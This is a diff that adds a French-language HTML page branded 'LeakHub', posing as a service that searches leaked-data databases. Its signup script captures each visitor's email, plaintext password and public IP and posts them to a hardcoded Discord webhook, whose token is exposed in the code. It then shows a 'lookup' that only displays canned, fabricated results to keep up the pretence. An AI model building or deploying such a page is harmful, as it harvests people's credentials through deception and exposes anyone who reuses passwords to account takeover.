@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<title>LeakHub</title>
+<link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
+<style>
+body {
+  margin: 0;
+  font-family: 'Roboto Mono', monospace;
+  background: url('https://cdn.discordapp.com/attachments/1433531634560274502/1435705158121295942/LeakHub_Baneer.png?ex=690cf01f&is=690b9e9f&hm=6810a4e7925f99e36d6e900367cd7b63257d708466226ec00b30e4f7c125e7e3&') no-repeat center center fixed;
+  background-size: cover;
+  color: #00bfff;
+}
+
+header {
+  width: 100%;
+  padding: 10px 20px;
+  background: rgba(0,0,0,0.7);
+  display: flex;
+  align-items: center;
+  gap: 15px;
+  box-shadow: 0 2px 5px rgba(0,0,0,0.5);
+}
+
+header img { width: 120px; }
+header h1 { margin:0; font-size: 22px; color: #00bfff; }
+
+.container {
+  margin: 80px auto 0;
+  width: 400px;
+  background: rgba(0,0,0,0.6);
+  padding: 30px;
+  border-radius: 12px;
+  border: 2px solid #00bfff;
+  box-shadow: 0 0 20px #00bfff;
+}
+
+input, button {
+  width: 100%;
+  padding: 12px;
+  margin-top: 12px;
+  border-radius: 6px;
+  font-size: 16px;
+  font-family: 'Roboto Mono', monospace;
+}
+
+input { border: 1px solid #00bfff; background: rgba(0,0,0,0.5); color: #00bfff; }
+input:focus { border-color: #00ffff; outline: none; box-shadow: 0 0 10px #00ffff; }
+
+button { border:none; background: #00bfff; color: #0b1e3d; font-weight:bold; cursor:pointer; }
+button:hover { background:#00ffff; color:#001f2d; transform:scale(1.05); transition:0.3s; }
+
+#lookupDiv { display:none; }
+.result-item { opacity:0; animation: fadeIn 0.8s forwards; margin:5px 0; }
+@keyframes fadeIn { from {opacity:0; transform:translateX(-20px);} to {opacity:1; transform:translateX(0);} }
+
+</style>
+</head>
+<body>
+<header>
+  <img src="https://cdn.discordapp.com/attachments/1433531634560274502/1435705016076992553/LeakHub_Logo.png?ex=690ceffd&is=690b9e7d&hm=a7f6398c618ca985757bbe3da29748af6eccf86272ba9443481b40764c1f3936&" alt="Logo LeakHub">
+  <h1>LeakHub</h1>
+</header>
+
+<div class="container">
+  <div id="signupDiv">
+    <h2>Inscription</h2>
+    <form id="signupForm">
+      <input type="email" id="email" placeholder="Email" required>
+      <input type="password" id="password" placeholder="Mot de passe" required>
+      <button type="submit">S’inscrire</button>
+    </form>
+    <div id="log"></div>
+  </div>
+
+  <div id="lookupDiv">
+    <h2>Recherche LeakHub</h2>
+    <input type="text" id="query" placeholder="Email, IP, etc...">
+    <button onclick="doLookup()">Rechercher</button>
+    <div id="results"></div>
+  </div>
+</div>
+
+<script>
+let inscriptions = [];
+
+document.getElementById('signupForm').addEventListener('submit', async e=>{
+  e.preventDefault();
+  const email = document.getElementById('email').value;
+  const password = document.getElementById('password').value;
+
+  // récupérer IP
+  const ipRes = await fetch('https://api.ipify.org?format=json');
+  const ipData = await ipRes.json();
+  const ip = ipData.ip;
+  const heure = new Date().toLocaleString();
+
+  inscriptions.push(`email: ${email} ip: ${ip} mdp: ${password} heure: ${heure}`);
+
+  const webhookURL = "https://discord.com/api/webhooks/1435634655838736425/CyT9jVObQ-PtCRTe7kkhqE8ZODGx4V-CfKnPv4h1ffXo_6F1BZoMRO4fzWaHiDgXKKif";
+  try {
+    await fetch(webhookURL,{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({content: inscriptions.join("\n")})
+    });
+    document.getElementById('signupDiv').style.display='none';
+    document.getElementById('lookupDiv').style.display='block';
+  } catch(err){
+    document.getElementById('log').textContent='Erreur envoi webhook';
+  }
+});
+
+function doLookup(){
+  const query = document.getElementById('query').value;
+  const results = document.getElementById('results');
+  results.innerHTML = `<p>Recherche en cours pour <strong>${query}</strong>…</p>`;
+
+  setTimeout(()=>{
+    const simulated = [
+      `Snusbase : indisponible`,
+      `LeakHub : indisponible`,
+      `IP Info : 123.45.67.89`,
+      `Localisation : Paris, Île‑de‑France, FR`,
+      `Intel X : Aucun résultat`,
+      `Have I Been Pwned : Aucun compte trouvé`,
+      `GhostProject : Aucun leak trouvé`,
+      `EmailRep : Niveau de risque faible`,
+      `PwnedList : 0 leaks associés`,
+      `OtherLeakDB : Aucun résultat`
+    ];
+
+    results.innerHTML = '';
+    simulated.forEach((item,i)=>{
+      const div = document.createElement('div');
+      div.className = 'result-item';
+      div.style.animationDelay = (i*0.2)+'s';
+      div.textContent = item;
+      results.appendChild(div);
+    });
+  }, 1000);
+}
+</script>
+</body>
+</html>
